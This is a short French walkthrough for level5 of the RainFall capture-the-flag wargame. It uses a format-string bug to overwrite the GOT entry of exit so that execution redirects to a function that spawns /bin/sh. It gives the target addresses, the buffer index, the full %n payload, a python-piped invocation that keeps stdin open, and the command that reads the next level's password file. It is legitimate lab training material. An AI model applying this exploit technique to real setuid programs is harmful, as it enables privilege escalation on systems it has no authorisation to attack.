# Level5 — Walkthrough

## 1. Objectif

Obtenir un shell level6. Le binaire est setuid level6 ; la fonction **o()** exécute **system("/bin/sh")** mais n’est jamais appelée.

## 2. Inspection

- **main** appelle **n()**.
- **n()** : `fgets(buffer, 512, stdin)`, **printf(buffer)** (format string), puis **exit(1)**.
- **o()** : **system("/bin/sh")**, puis _exit(1). Jamais appelée.

## 3. Vulnérabilité

- **Format string** dans **n()**. Après **printf**, le programme appelle **exit(1)**.
- En écrasant l’entrée **GOT** de **exit** (0x8049838) par l’adresse de **o** (0x080484a4), l’appel à `exit(1)` redirige vers **o()** → **system("/bin/sh")**.

## 4. Exploit

- Écrire **0x080484a4** à l’adresse **0x8049838** (GOT de exit). Méthode validée : un **%n** avec l’index du buffer.
- Sur **RainFall** : buffer à l’**index 4** (dump `AAAA` + `%1$p`…`%5$p` → 0x41414141 en position 4). Payload : `\x38\x98\x04\x08` + `%134513824x%4$n`. Utiliser `( python -c '...'; cat ) | ./level5` pour garder stdin ouvert et pouvoir taper dans le shell.

## 5. Récupération du mot de passe

Dans le shell level6 : `cat /home/user/level6/.pass`. Consigner dans `level5/flag`.
